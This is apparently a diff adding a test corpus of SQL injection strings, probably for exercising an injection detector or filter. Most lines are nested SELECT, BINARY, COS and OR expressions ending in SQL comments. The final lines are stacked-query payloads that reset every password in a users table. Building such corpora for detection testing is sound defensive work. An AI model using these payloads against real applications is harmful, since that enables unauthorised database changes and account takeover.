@@ -1,0 +1,315 @@
+#
+#
+#
+ ( 'a' )  --
+' - ( (SELECT BINARY ( 'b')) )  --
+' - ( ( BINARY COS ( 'b')) )  --
+' - ( BINARY BINARY ( 'b') )  --
+ ( 1 OR 1 )  --
+ ( 1 OR @a )  --
+ ( ( 1 ) )  --
+ ( 1 * @a )  --
+ ( (SELECT ( 1)) )  --
+ ( (SELECT ( @a)) )  --
+ ( BINARY ( 1) )  --
+ ( BINARY ( @a) )  --
+ ( @a OR 1 )  --
+ ( @a OR @a )  --
+ ( ( @a ) )  --
+ ( ( 1 OR 'b') )  --
+ ( ( 1 * 'b') )  --
+ ( (SELECT ( SELECT 'b')) )  --
+ ( ( SELECT ( 'b')) )  --
+ ( (SELECT 1 OR 'b') )  --
+ ( (SELECT 'a' OR 'b') )  --
+ ( (SELECT BINARY ( 'b')) )  --
+ ( (SELECT BINARY COS ( 'b')) )  --
+ ( (SELECT @a OR 'b') )  --
+ ( COS ( 1 OR 'b') )  --
+ ( COS ( 'a' OR 'b') )  --
+ ( COS ( BINARY ( 'b')) )  --
+ ( COS ( BINARY COS ( 'b')) )  --
+ ( COS ( @a OR 'b') )  --
+ ( 'a' OR 1 )  --
+ ( 'a' OR 'a' )  --
+ ( 'a' OR @a )  --
+ ( 'a' )  --
+ ( 'a' * 1 )  --
+ ( 'a' * 'a' )  --
+ ( 'a' * @a )  --
+ ( BINARY ( SELECT 'b') )  --
+ ( ( BINARY ( 'b')) )  --
+ ( BINARY BINARY ( 'b') )  --
+ ( BINARY BINARY COS ( 'b') )  --
+ ( ( @a OR 'b') )  --
+ ( ( @a * 'b') )  --
+ ( 1 in ( BINARY COS ( 'b')) )  --
+ ( (SELECT ( 1 OR 'b')) )  --
+ ( (SELECT ( SELECT 1)) )  --
+ ( (SELECT ( SELECT @a)) )  --
+ ( (SELECT ( 'a' OR 'b')) )  --
+ ( (SELECT ( BINARY ( 'b'))) )  --
+ ( (SELECT ( BINARY COS ( 'b'))) )  --
+ ( (SELECT ( @a OR 'b')) )  --
+ ( (SELECT 1 OR ( 'b')) )  --
+ ( (SELECT 1 OR 1) )  --
+ ( (SELECT 1 OR COS ( 'b')) )  --
+ ( (SELECT 1 OR @a) )  --
+ ( (SELECT 1 LIMIT 1) )  --
+ ( (SELECT COS ( 1 OR 'b')) )  --
+ ( (SELECT COS ( ( SELECT 'b'))) )  --
+ ( (SELECT COS ( 'a' OR 'b')) )  --
+ ( (SELECT COS ( BINARY ( 'b'))) )  --
+ ( (SELECT COS ( BINARY COS ( 'b'))) )  --
+ ( (SELECT COS ( @a OR 'b')) )  --
+ ( (SELECT 'a' OR ( 'b')) )  --
+ ( (SELECT 'a' OR 1) )  --
+ ( (SELECT 'a' OR COS ( 'b')) )  --
+ ( (SELECT 'a' OR @a) )  --
+ ( (SELECT 'a' LIMIT 1) )  --
+ ( (SELECT BINARY ( 1)) )  --
+ ( (SELECT BINARY ( SELECT 'b')) )  --
+ ( (SELECT BINARY ( COS ( 'b'))) )  --
+ ( (SELECT BINARY ( @a)) )  --
+ ( (SELECT BINARY COS ( 1)) )  --
+ ( (SELECT BINARY COS ( COS ( 'b'))) )  --
+ ( (SELECT BINARY COS ( @a)) )  --
+ ( (SELECT BINARY BINARY ( 'b')) )  --
+ ( (SELECT BINARY BINARY COS ( 'b')) )  --
+ ( (SELECT @a OR ( 'b')) )  --
+ ( (SELECT @a OR 1) )  --
+ ( (SELECT @a OR COS ( 'b')) )  --
+ ( (SELECT @a OR @a) )  --
+ ( (SELECT @a LIMIT 1) )  --
+ ( COS ( 1 OR ( 'b')) )  --
+ ( COS ( 1 OR 1) )  --
+ ( COS ( 1 OR COS ( 'b')) )  --
+ ( COS ( 1 OR @a) )  --
+ ( COS ( COS ( ( SELECT 'b'))) )  --
+ ( COS ( COS ( BINARY ( 'b'))) )  --
+ ( COS ( 'a' OR ( 'b')) )  --
+ ( COS ( 'a' OR 1) )  --
+ ( COS ( 'a' OR COS ( 'b')) )  --
+ ( COS ( 'a' OR @a) )  --
+ ( COS ( BINARY ( 1)) )  --
+ ( COS ( BINARY ( SELECT 'b')) )  --
+ ( COS ( BINARY ( COS ( 'b'))) )  --
+ ( COS ( BINARY ( @a)) )  --
+ ( COS ( BINARY BINARY ( 'b')) )  --
+ ( COS ( BINARY BINARY COS ( 'b')) )  --
+ ( COS ( @a OR ( 'b')) )  --
+ ( COS ( @a OR 1) )  --
+ ( COS ( @a OR COS ( 'b')) )  --
+ ( COS ( @a OR @a) )  --
+ ( BINARY ( 1 OR 'b') )  --
+ ( BINARY ( SELECT ( 'b')) )  --
+ ( BINARY ( SELECT 1) )  --
+ ( BINARY ( SELECT COS ( 'b')) )  --
+ ( BINARY ( SELECT @a) )  --
+ ( BINARY ( 'a' OR 'b') )  --
+ ( BINARY ( BINARY COS ( 'b')) )  --
+ ( BINARY ( @a OR 'b') )  --
+ ( BINARY COS ( 1 OR 'b') )  --
+ ( BINARY COS ( ( SELECT 'b')) )  --
+ ( BINARY COS ( 'a' OR 'b') )  --
+ ( BINARY COS ( BINARY ( 'b')) )  --
+ ( BINARY COS ( BINARY COS ( 'b')) )  --
+ ( BINARY COS ( @a OR 'b') )  --
+ ( BINARY BINARY ( 1) )  --
+ ( BINARY BINARY ( SELECT 'b') )  --
+ ( BINARY BINARY ( COS ( 'b')) )  --
+ ( BINARY BINARY ( @a) )  --
+ ( BINARY BINARY COS ( 1) )  --
+ ( BINARY BINARY COS ( COS ( 'b')) )  --
+ ( BINARY BINARY COS ( @a) )  --
+ ( BINARY BINARY BINARY ( 'b') )  --
+ ( BINARY BINARY BINARY COS ( 'b') )  --
+ ( @a in ( BINARY COS ( 'b')) )  --
+ ( 1 OR ( BINARY ( 'b')) )  --
+ ( 1 OR ( BINARY COS ( 'b')) )  --
+ ( 1 OR COS ( BINARY ( 'b')) )  --
+ ( 1 ) in ( BINARY ( 'b') )  --
+ ( 1 in ( BINARY BINARY ( 'b')) )  --
+ ( 1 * COS ( BINARY ( 'b')) )  --
+ ( (SELECT ( 1 OR ( 'b'))) )  --
+ ( (SELECT ( 1 OR 1)) )  --
+ ( (SELECT ( 1 OR COS ( 'b'))) )  --
+ ( (SELECT ( 1 OR @a)) )  --
+ ( (SELECT ( SELECT 1 OR 'b')) )  --
+ ( (SELECT ( SELECT 'a' OR 'b')) )  --
+ ( (SELECT ( SELECT BINARY ( 'b'))) )  --
+ ( (SELECT ( SELECT BINARY COS ( 'b'))) )  --
+ ( (SELECT ( SELECT @a OR 'b')) )  --
+ ( (SELECT ( COS ( ( SELECT 'b')))) )  --
+ ( (SELECT ( COS ( BINARY ( 'b')))) )  --
+ ( (SELECT ( 'a' OR ( 'b'))) )  --
+ ( (SELECT ( 'a' OR 1)) )  --
+ ( (SELECT ( 'a' OR COS ( 'b'))) )  --
+ ( (SELECT ( 'a' OR @a)) )  --
+ ( (SELECT ( BINARY ( 1))) )  --
+ ( (SELECT ( BINARY ( SELECT 'b'))) )  --
+ ( (SELECT ( BINARY ( COS ( 'b')))) )  --
+ ( (SELECT ( BINARY ( @a))) )  --
+ ( (SELECT ( BINARY BINARY ( 'b'))) )  --
+ ( (SELECT ( BINARY BINARY COS ( 'b'))) )  --
+ ( (SELECT ( @a OR ( 'b'))) )  --
+ ( (SELECT ( @a OR 1)) )  --
+ ( (SELECT ( @a OR COS ( 'b'))) )  --
+ ( (SELECT ( @a OR @a)) )  --
+ ( (SELECT 1 OR ( 1)) )  --
+ ( (SELECT 1 OR ( COS ( 'b'))) )  --
+ ( (SELECT 1 OR ( @a)) )  --
+ ( (SELECT 1 OR 1 * 'b') )  --
+ ( (SELECT 1 OR 'a' * 'b') )  --
+ ( (SELECT 1 OR @a * 'b') )  --
+ ( (SELECT 1 ) OR ( 'b') )  --
+ ( (SELECT 1 ) OR COS ( 'b') )  --
+ ( ( SELECT 1 ) OR 'b' )  --
+ ( (SELECT 1 UNION ( SELECT 'b')) )  --
+ ( (SELECT 1 in ( BINARY ( 'b'))) )  --
+ ( (SELECT COS ( ( SELECT ( 'b')))) )  --
+ ( (SELECT COS ( ( SELECT 1))) )  --
+ ( (SELECT COS ( ( SELECT COS ( 'b')))) )  --
+ ( (SELECT COS ( ( SELECT @a))) )  --
+ ( (SELECT COS ( BINARY BINARY ( 'b'))) )  --
+ ( (SELECT 'a' OR ( 1)) )  --
+ ( (SELECT 'a' OR ( COS ( 'b'))) )  --
+ ( (SELECT 'a' OR ( @a)) )  --
+ ( (SELECT 'a' OR 1 * 'b') )  --
+ ( (SELECT 'a' OR 'a' * 'b') )  --
+ ( (SELECT 'a' OR @a * 'b') )  --
+ ( (SELECT 'a' ) OR ( 'b') )  --
+ ( (SELECT 'a' ) OR COS ( 'b') )  --
+ ( ( SELECT 'a' ) OR 'b' )  --
+ ( (SELECT 'a' UNION ( SELECT 'b')) )  --
+ ( (SELECT 'a' in ( BINARY ( 'b'))) )  --
+ ( (SELECT BINARY ( 1 OR 'b')) )  --
+ ( (SELECT BINARY ( 1 * 'b')) )  --
+ ( (SELECT BINARY ( SELECT ( 'b'))) )  --
+ ( (SELECT BINARY ( SELECT 1)) )  --
+ ( (SELECT BINARY ( SELECT COS ( 'b'))) )  --
+ ( (SELECT BINARY ( SELECT @a)) )  --
+ ( (SELECT BINARY ( 'a' OR 'b')) )  --
+ ( (SELECT BINARY ( 'a' * 'b')) )  --
+ ( (SELECT BINARY ( BINARY ( 'b'))) )  --
+ ( (SELECT BINARY ( BINARY COS ( 'b'))) )  --
+ ( (SELECT BINARY ( @a OR 'b')) )  --
+ ( (SELECT BINARY ( @a * 'b')) )  --
+ ( (SELECT BINARY COS ( ( SELECT 'b'))) )  --
+ ( (SELECT BINARY COS ( BINARY ( 'b'))) )  --
+ ( (SELECT BINARY BINARY ( 1)) )  --
+ ( (SELECT BINARY BINARY ( SELECT 'b')) )  --
+ ( (SELECT BINARY BINARY ( COS ( 'b'))) )  --
+ ( (SELECT BINARY BINARY ( @a)) )  --
+ ( (SELECT BINARY BINARY BINARY ( 'b')) )  --
+ ( (SELECT BINARY BINARY BINARY COS ( 'b')) )  --
+ ( (SELECT @a OR ( 1)) )  --
+ ( (SELECT @a OR ( COS ( 'b'))) )  --
+ ( (SELECT @a OR ( @a)) )  --
+ ( (SELECT @a OR 1 * 'b') )  --
+ ( (SELECT @a OR 'a' * 'b') )  --
+ ( (SELECT @a OR @a * 'b') )  --
+ ( (SELECT @a ) OR ( 'b') )  --
+ ( (SELECT @a ) OR COS ( 'b') )  --
+ ( ( SELECT @a ) OR 'b' )  --
+ ( (SELECT @a UNION ( SELECT 'b')) )  --
+ ( (SELECT @a in ( BINARY ( 'b'))) )  --
+ ( COS ( ( SELECT ( SELECT 'b'))) )  --
+ ( COS ( ( SELECT 1 OR 'b')) )  --
+ ( COS ( ( SELECT 'a' OR 'b')) )  --
+ ( COS ( ( SELECT BINARY ( 'b'))) )  --
+ ( COS ( ( SELECT BINARY COS ( 'b'))) )  --
+ ( COS ( ( SELECT @a OR 'b')) )  --
+ ( COS ( BINARY ( BINARY ( 'b'))) )  --
+ ( COS ( BINARY BINARY BINARY ( 'b')) )  --
+ ( 'a' OR ( BINARY ( 'b')) )  --
+ ( 'a' OR ( BINARY COS ( 'b')) )  --
+ ( 'a' OR COS ( BINARY ( 'b')) )  --
+ ( 'a' ) in ( BINARY ( 'b') )  --
+ ( 'a' * COS ( BINARY ( 'b')) )  --
+ ( BINARY ( 1 OR ( 'b')) )  --
+ ( BINARY ( 1 OR 1) )  --
+ ( BINARY ( 1 OR COS ( 'b')) )  --
+ ( BINARY ( 1 OR @a) )  --
+ ( BINARY ( 1 ) OR 'b' )  --
+ ( BINARY ( SELECT ( 1)) )  --
+ ( BINARY ( SELECT ( SELECT 'b')) )  --
+ ( BINARY ( SELECT ( COS ( 'b'))) )  --
+ ( BINARY ( SELECT ( @a)) )  --
+ ( BINARY ( SELECT 1 OR 'b') )  --
+ ( BINARY ( SELECT 1 * 'b') )  --
+ ( BINARY ( SELECT 'a' OR 'b') )  --
+ ( BINARY ( SELECT 'a' * 'b') )  --
+ ( BINARY ( SELECT BINARY ( 'b')) )  --
+ ( BINARY ( SELECT BINARY COS ( 'b')) )  --
+ ( BINARY ( SELECT @a OR 'b') )  --
+ ( BINARY ( SELECT @a * 'b') )  --
+ ( BINARY ( COS ( ( SELECT 'b'))) )  --
+ ( BINARY ( COS ( BINARY ( 'b'))) )  --
+ ( BINARY ( 'a' OR ( 'b')) )  --
+ ( BINARY ( 'a' OR 1) )  --
+ ( BINARY ( 'a' OR COS ( 'b')) )  --
+ ( BINARY ( 'a' OR @a) )  --
+ ( BINARY ( 'a' ) OR 'b' )  --
+ ( BINARY ( BINARY ( SELECT 'b')) )  --
+ ( BINARY ( BINARY BINARY ( 'b')) )  --
+ ( BINARY ( BINARY BINARY COS ( 'b')) )  --
+ ( BINARY ( @a OR ( 'b')) )  --
+ ( BINARY ( @a OR 1) )  --
+ ( BINARY ( @a OR COS ( 'b')) )  --
+ ( BINARY ( @a OR @a) )  --
+ ( BINARY ( @a ) OR 'b' )  --
+ ( BINARY COS ( ( SELECT ( 'b'))) )  --
+ ( BINARY COS ( ( SELECT 1)) )  --
+ ( BINARY COS ( ( SELECT COS ( 'b'))) )  --
+ ( BINARY COS ( ( SELECT @a)) )  --
+ ( BINARY COS ( BINARY BINARY ( 'b')) )  --
+ ( BINARY BINARY ( 1 OR 'b') )  --
+ ( BINARY BINARY ( 1 * 'b') )  --
+ ( BINARY BINARY ( SELECT ( 'b')) )  --
+ ( BINARY BINARY ( SELECT 1) )  --
+ ( BINARY BINARY ( SELECT COS ( 'b')) )  --
+ ( BINARY BINARY ( SELECT @a) )  --
+ ( BINARY BINARY ( 'a' OR 'b') )  --
+ ( BINARY BINARY ( 'a' * 'b') )  --
+ ( BINARY BINARY ( BINARY ( 'b')) )  --
+ ( BINARY BINARY ( BINARY COS ( 'b')) )  --
+ ( BINARY BINARY ( @a OR 'b') )  --
+ ( BINARY BINARY ( @a * 'b') )  --
+ ( BINARY BINARY COS ( ( SELECT 'b')) )  --
+ ( BINARY BINARY COS ( BINARY ( 'b')) )  --
+ ( BINARY BINARY BINARY ( 1) )  --
+ ( BINARY BINARY BINARY ( SELECT 'b') )  --
+ ( BINARY BINARY BINARY ( COS ( 'b')) )  --
+ ( BINARY BINARY BINARY ( @a) )  --
+ ( BINARY BINARY BINARY BINARY ( 'b') )  --
+ ( BINARY BINARY BINARY BINARY COS ( 'b') )  --
+ ( @a OR ( BINARY ( 'b')) )  --
+ ( @a OR ( BINARY COS ( 'b')) )  --
+ ( @a OR COS ( BINARY ( 'b')) )  --
+ ( @a ) in ( BINARY ( 'b') )  --
+ ( @a in ( BINARY BINARY ( 'b')) )  --
+ ( @a * COS ( BINARY ( 'b')) )  --
+ (  1 - (SELECT BINARY ( 1)) )  --
+ (  1 - BINARY ( SELECT 1) )  --
+ (  1 - BINARY COS ( ( 1)) )  --
+ (  1 - BINARY BINARY ( 1) )  --
+ (  1 - BINARY BINARY COS ( 1) )  --
+ (  1 - BINARY BINARY BINARY ( 'b') )  --
+ (  'a' or (SELECT BINARY ( 'b')) )  --
+ (  'a' or BINARY ( SELECT 'b') )  --
+ (  'a' or BINARY COS ( 1) )  --
+ (  'a' or BINARY BINARY ( 'b') )  --
+ (  'a' or BINARY BINARY COS ( 'b') )  --
+ (  1 IN (1) or   (SELECT BINARY ( 'b')) )  --
+ (  1 IN (1) or   BINARY ( SELECT 'b') )  --
+ (  1 IN (1) or   BINARY COS ( 1) )  --
+ (  1 IN (1) or   BINARY BINARY ( 'b') )  --
+ (  1 IN (1) or   BINARY BINARY COS ( 'b') )  --
+(select 1 from dual union select 1 limit 1) --
+(select 1); (select 1); update users set password = 99
+(select 1); select 1; update users set password = 99
+select 1; (select 1); update users set password = 99
+1; update users set password=1
+ ( (SELECT 'b') ) ; UPDATE user set password = 99;
+ ( (SELECT @a) ) ; UPDATE user set password = 99;
